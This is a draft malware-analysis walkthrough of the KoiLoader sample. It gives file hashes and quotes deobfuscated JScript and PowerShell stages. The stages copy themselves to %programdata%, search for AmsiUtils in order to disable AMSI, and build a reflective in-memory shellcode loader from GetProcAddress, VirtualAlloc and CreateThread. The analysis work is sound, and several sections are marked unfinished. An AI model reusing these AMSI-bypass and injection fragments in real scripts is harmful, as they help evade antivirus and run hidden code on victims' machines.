---
title: KoiLoader - Malware Analysis Walkthrough
date: 2025-08-01
tags:
  - malware
status:
  - In-progress
---

> This is still kind of a draft version of the post. However I wanted to post it so I can show snippet of what I'm doing. The markdown composition as well as the finall template of the report is also a work in progress ;D
{: .prompt-info }


### Threat Overview
- **Threat Name**: KoiLoader
- File Format: #JS, #Powershell, #EXE
- **First Stage**:
  - sourceFile: 21bc8b52d903de7f90c11d46e08a215fa88afab2f1f932ff6b56307a14402014.js
	- SHA256: 21bc8b52d903de7f90c11d46e08a215fa88afab2f1f932ff6b56307a14402014
- **Second Stage**:
  - File: homalogonatous65K.php
  	- SHA256: C6D433EB10BCD8CF38D3E788D5A7221122C81A824B847073480551FA7D55748E
	-	File: cheekpieceGAR.ps1
	  -	SHA256: 9E2F3AFE2363D473D0EC9C711B55FA6413A3BA2139F8207097C23F908E39EC4
- **Thirds Stage**: 
  - File: cummersMG.exe
  - SHA256: D1F32BE6A9D1BFDC0489D06224B16D99AAA641D9E7DC6FAAD142BDE79EB09E1E
- **Observations**	  
  - Behavior: #todo
  - C2 Communication: #todo
  - Persistence Mechanisms: #todo
- **Attack Vector**:
  - Entry Point: #todo
  - Exploited Vulnerabilities: #todo
- **Indicators of Compromise (IoCs)**: #todo

### Walkthrough
#### Initial file
Short simply obfuscated JS file. We have Powershell commands also to finalize the first stage of attack and download rest of the payload.

```javascript
var w1="WSc",w2="riPt",w4="eLl"
var wsh=w1+w2+".sH"+w4
var bbj=new ActiveXObject(wsh)
```
Script uses outdated `ActiveXObject`[^1], it's an insecure and deprecated component of older versions of InternetExplorer, now this technology is replaced by APIs. So this malware is really limited in terms of targets which can be affected. But some legacy systems may use IE and have weaker security.  Malware dedicated for Windows hosts.

Interestingly the code checks if the system is 32 or 64 bit. 
```Powershell
GetObject("winmgmts:root\\cimv2:Win32_Processor='cpu0'").AddressWidth==64?"SysWOW64":"System32"
```

Than the script names itself `rMachineGuidr.js` and tries to copy itself into `%programdata%` of the user. Also in case in which this instructions might fail, the `catch(e) {}` is supposed make this attempt silent to not raise unnecessary alerts. 
```javascript
var agn='r'+bbj.RegRead('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid')+'r.js'
if (WScript.ScriptName != agn) {
	var fs5="yFi"
	try {
	fso["Cop"+fs5+"le"](WScript.ScriptFullName, bbj.ExpandEnvironmentStrings("%programdata%")+"\\"+agn)
	} catch (e) {}
}
```

File runs itself and tries to create a copy in temp folder under name "7zMJF008IA8P".
Than deletes itself, checks if the task is accomplished and if so it runs another command to download second stage with high privileges on the host.
```javascript
var mtx_file = bbj.ExpandEnvironmentStrings("%tem"+"p%")+"\\"+mtx_name
var fs1="leteFi"
var fs2="leExis"
try {
	fso["De"+fs1+"le"](mtx_file)
} catch (e) {}
if (!fso["Fi"+fs2+"ts"](mtx_file))
{
```

The last commands in this stage of the attack start another powershell. Returns list of types of Reference assemblies[^2] then iterates throught it and checks for matches. `*a?s?U*ls`, asterisk - any number of characters, ? - single character.
```{Powershell}
$aR2Oew=[Ref].Assembly.GetTypes()
Foreach($llin in $aR2Oew) {if ($llin.Name -like '*a?s?U*ls') {echo $llin}};
```

![Desktop View](imges/2025-08-01-KoiLoader/Pasted image 20250725231237.png)

AmsiUtils stands for `Anti-malware Scan Interface` integrated with Microsoft Defender Antivirus. Next the new enviroment is created with the path to the file/directory `7zMJF008IA8P`. And lastly it downloads 2 files from compromised website `homalogonatous65K.php` and `cheekpieceGAR.ps1`.

#### homalogonatous65K.php
SHA256: C6D433EB10BCD8CF38D3E788D5A7221122C81A824B847073480551FA7D55748E


It's a Powershell in a trenchcoat of PHP.
Content of this file is each time partially generated which guarantees some uniqnes.
It's a 2-liner, first the script does a check and return True or False. It could be some failsafe mechanism. 
```{Powershell}
PS C:\Windows\system32> $vl1 = ("zrSszQb1JW2YVwZXPF153HT4IlqG4MCetbtvVwZXPF153HT4gxDA1Tk0KDtKVwZXPF153HT4dULx1OVJ9MZEVwZXPF153HT4iltcNnX3kkDl" -match "VwZXPF153HT4");
echo $vl1
True
```

Oh nevermind it's not a failsafe I jumped to this conclusion to early. It's just a piece of code returning true, which is needed later. 
Together with variable from the initial part of attack this script disables the Amsi by corrupting the internal state `amsiInitFailed` set to true, which may lead to module thinking it's broken/not working currently.
#### cheekpieceGAR.ps1
SHA256: E9E2F3AFE2363D473D0EC9C711B55FA6413A3BA2139F8207097C23F908E39EC4

 Parameter for IWR -`UseBasicParsing`, it's deprecated since Powershell 6.0. Also it explains the mysterious `-usebas` which was shortcut for that.
##### Function GDT
```powershell
$DA = New-Object System.Reflection.AssemblyName('RD')
$AB = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DA, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MB = $AB.DefineDynamicModule('IMM', $false)
$TB = $MB.DefineType('MDT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
$CB = $TB.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
$CB.SetImplementationFlags('Runtime, Managed')
$MB = $TB.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
$MB.SetImplementationFlags('Runtime, Managed')
```
Step by step:
1. This ps1 creates an assemly named `RD`
2. Creates module `IMM` with `$false` which, apparently does nothing? Or maybe in older version of Powershell it has some purpose. Currently output of this snippet of function looks like this.

```powershell
PS C:\Windows\system32> $DA = New-Object System.Reflection.AssemblyName('RD')
$AB = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DA, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MB = $AB.DefineDynamicModule('IMM', $false)
echo $MB


FullyQualifiedName : IMM
MDStreamVersion    : 131072
ModuleVersionId    : 174cd321-1e72-4051-8915-9ba4d535aa9e
MetadataToken      : 1
ScopeName          : IMM
Name               : <In Memory Module>
Assembly           : RD, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
CustomAttributes   : {}
ModuleHandle       : System.ModuleHandle
```
I ran it also without the `$false` and the output didn't change, or maybe it's a hidden value of the assembly? I will have to go back to this, so far I ran it side by side with and without this parameter, and the output looks the same, but somehow it still is created under the same assembly name, even thou I used different one? Once I clear this session maybe it will become clear.
So far it defines an assembly module. #todo

##### Function GPA
```powershell
$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
$UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)
$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
$tmpPtr = New-Object IntPtr
$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
```
This one is more easier to understand for someone unfamiliar as me. 
As I can tell from it's execution rather than create assumptions. 
1. `$SystemAssembly` returns path to System.dll.


And boom while searching for explanation of `system.dll unsafenativemethods`, by accident I found similar code related to CobaltStrike beacon.
![Desktop View](imges/2025-08-01-KoiLoader/Pasted image 20250726192507.png)
Source: https://medium.com/@polygonben/deobfuscating-a-powershell-cobalt-strike-beacon-loader-c650df862c34
The code is pretty much the same, or accomplishes the same task. It is slighlty changed, the structure, variables (obviously) but it's mostly the same.
I'm still experimenting with how should I write this walkthrough, but I might adapt the way of explaining snippets of code as a comments under just like the Ben Folland, author of the article in link above.

Functions used in GPA are "official" I will try to explain them in my way as I understand them, but feel free to check the official documentation for clarification. I hope I won't misinterpret anything or just don't write it down wrong which would change how the function might work, but well I'm still learning ;D
However they might be slightly altered, or it's just the obfuscated way of how are they written here.
2. `$UnsafeNativeMethods` returns type of itself
3. `$GetModuleHandle` returns handle to specified process, the process has to be loaded in memory/address space of the calling process.
4. `$GetProcAddress` this one is easy, it returns address of the process :P However here as additional parameters 
5. `$Kern32Handle`


```powershell
$marshal = [System.Runtime.InteropServices.Marshal]

[Byte[]]$sc = ['som hex values, probably code readable in ascii']

$VAAddr = GPA kernel32.dll VirtualAlloc
$VADeleg = GDT @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$CTAddr = GPA kernel32.dll CreateThread
$CTDeleg = GDT @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$CT = $marshal::GetDelegateForFunctionPointer($CTAddr, $CTDeleg)
$WFSOAddr = GPA kernel32.dll WaitForSingleObject
$WFSODeleg = GDT @([IntPtr], [Int32]) ([Int])
$WFSO = $marshal::GetDelegateForFunctionPointer($WFSOAddr, $WFSODeleg)

#System.Runtime.InteropServices.Marshal - it's a collection of methods for managing and interacting with memory 
```
Aaand as I was reading further I stumbled on this: https://github.com/PowerShellMafia/PowerSploit/issues/293
So the attackers are trying to inject `cummersMG.exe` into memory and exploit the victim machine.  So now I'm more curious what's does the EXE file since the powershell script has been analyzed.  

I tried to 

#### cummersMG.exe
sha256: D1F32BE6A9D1BFDC0489D06224B16D99AAA641D9E7DC6FAAD142BDE79EB09E1E

Compiler stamp: Tue May 20 04:31:15 2025 (UTC)

![Desktop View](imges/2025-08-01-KoiLoader/Pasted image 20250801190121.png)









### Revision History
- **2025-07-17**: Initial threat acquisition and research.
- **2025-09-05**: Posting draft version of post.


### Summary

[^1]: An ActiveX object is an instance of a class that exposes properties, methods, and events to ActiveX clients. ActiveX objects support the COM. An ActiveX component is an application or library that is capable of creating one or more ActiveX objects.

[^2]: _Reference assemblies_``` are a special type of assembly that contain only the minimum amount of metadata required to represent the library's public API surface. [...] enables developers to build programs that target a specific library version without having the full implementation assembly for that version.```


